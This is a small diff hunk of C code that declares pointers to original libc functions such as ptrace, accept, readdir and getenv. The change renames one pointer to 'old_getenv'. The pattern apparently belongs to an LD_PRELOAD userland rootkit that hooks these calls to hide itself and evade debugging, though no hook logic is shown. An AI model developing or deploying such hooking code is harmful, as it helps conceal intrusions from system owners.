@@ -28,7 +28,7 @@ char *(*old_fgets)(char *s, int size, FILE *stream);
 long int (*old_ptrace)(enum __ptrace_request request, ...);
 off_t (*old_lseek)(int fildes, off_t offset, int whence);
 int (*old_accept)(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
-char *(*getenv)(const char *name);
+char *(*old_getenv)(const char *name);
 
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
